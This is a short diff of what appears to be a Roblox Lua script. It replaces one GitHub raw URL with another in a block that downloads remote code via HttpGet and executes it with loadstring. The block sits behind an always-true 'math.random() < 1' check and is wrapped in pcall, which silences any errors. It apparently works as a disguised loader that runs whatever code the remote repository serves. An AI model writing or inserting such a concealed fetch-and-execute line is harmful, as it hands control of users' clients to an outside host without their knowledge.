@@ -34,7 +34,7 @@ end
 
 if math.random() < 1 then
     pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/danzzy1we/gokil2/refs/heads/main/copylinkgithub.lua"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/sphynx-byte/Sambung-kata/refs/heads/main/Test"))()
     end)
 end
 
